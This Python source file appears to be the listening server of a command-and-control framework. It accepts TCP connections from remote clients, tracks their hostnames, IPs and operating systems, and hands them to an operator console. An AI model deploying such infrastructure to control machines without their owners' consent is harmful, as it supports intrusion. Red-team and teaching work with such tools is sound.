import socket
import threading
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.protocol import recv_msg, send_msg, make_msg
from server.config import BIND_HOST, BIND_PORT, MAX_CLIENTS
from server.client_handler import ClientHandler


class C2Server:
    def __init__(self, host=BIND_HOST, port=BIND_PORT):
        self.host = host
        self.port = port
        self.server_sock = None
        self.clients: dict[str, ClientHandler] = {}
        self.lock = threading.Lock()
        self.running = False
        self._next_cid = 0

    def start(self):
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind((self.host, self.port))
        self.server_sock.listen(5)
        self.running = True
        print(f"[*] C2 Server listening on {self.host}:{self.port}")
        try:
            self._accept_loop()
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def _accept_loop(self):
        self.server_sock.settimeout(1.0)
        while self.running:
            try:
                client_sock, addr = self.server_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            if len(self.clients) >= MAX_CLIENTS:
                client_sock.close()
                continue
            handler = ClientHandler(client_sock, addr, self)
            handler.daemon = True
            handler.start()

    def register_client(self, handler):
        with self.lock:
            self._next_cid += 1
            cid = f"client-{self._next_cid}"
            self.clients[cid] = handler
            handler.client_id = cid
            return cid

    def unregister_client(self, cid):
        with self.lock:
            if cid in self.clients:
                del self.clients[cid]

    def get_client(self, cid):
        with self.lock:
            return self.clients.get(cid)

    def list_clients(self):
        with self.lock:
            return [
                {
                    "id": cid,
                    "hostname": h.info.get("hostname", "?"),
                    "ip": h.addr[0],
                    "os": h.info.get("os", "?"),
                }
                for cid, h in self.clients.items()
            ]

    def stop(self):
        self.running = False
        with self.lock:
            for h in list(self.clients.values()):
                h.close()
            self.clients.clear()
        if self.server_sock:
            try:
                self.server_sock.close()
            except OSError:
                pass
        print("\n[*] Server stopped.")


def main():
    from server.cli import OperatorCLI
    server = C2Server()
    cli = OperatorCLI(server)
    cli.start()
    server.start()


if __name__ == "__main__":
    main()
